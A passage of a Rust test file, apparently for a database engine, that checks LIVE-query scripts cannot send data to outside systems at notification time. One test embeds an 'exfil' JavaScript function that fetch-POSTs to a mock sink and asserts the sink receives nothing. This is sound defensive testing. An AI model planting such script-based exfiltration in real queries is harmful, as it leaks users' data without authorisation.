	skip_ok(res, 1)?;
	tokio::time::sleep(Duration::from_millis(300)).await;

	// The subscriber's POST must not have reached the sink.
	let received = server.received_requests().await.unwrap_or_default();
	assert!(
		received.is_empty(),
		"a LIVE projection's script must not POST to an external system at notification time, the sink got {} request(s)",
		received.len(),
	);

	Ok(())
}

/// The sibling vector through the `fetch` global, which reaches the network
/// through its own client rather than the builtin bridge. A write-method or
/// body-bearing `fetch` is refused in a LIVE frame the way `http::post` is; a
/// read with no body is left alone, as `http::get` is. The sink must receive
/// nothing for the POST.
#[cfg(all(feature = "scripting", feature = "http"))]
#[tokio::test]
async fn live_query_script_fetch_may_not_exfiltrate() -> Result<()> {
	use wiremock::matchers::{method, path};
	use wiremock::{Mock, MockServer, ResponseTemplate};

	let server = MockServer::start().await;
	Mock::given(method("POST"))
		.and(path("/sink"))
		.respond_with(ResponseTemplate::new(200))
		.mount(&server)
		.await;

	let (_, dbs) = new_ds("test", "test", true).await?;
	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);

	let res = &mut dbs.execute("DEFINE TABLE person SCHEMALESS;", &ses, None).await?;
	skip_ok(res, 1)?;

	let sql = format!(
		"LIVE SELECT *, (function() {{ return await fetch('{}/sink', {{ method: 'POST', body: 'saw' }}); }}) AS exfil FROM person;",
		server.uri()
	);
	let res = &mut dbs.execute(&sql, &ses, None).await?;
	let lqid = res.remove(0).result?;
	assert_eq!(
		lqid.kind(),
		Kind::Uuid,
		"the LIVE query must register before the write that fires it"
	);

	let res = &mut dbs.execute("CREATE person:1;", &ses, None).await?;
	skip_ok(res, 1)?;
	tokio::time::sleep(Duration::from_millis(300)).await;

	let received = server.received_requests().await.unwrap_or_default();
	assert!(
		received.is_empty(),
		"a LIVE projection's script must not fetch-POST to an external system at notification time, the sink got {} request(s)",
		received.len(),
	);

	Ok(())
}
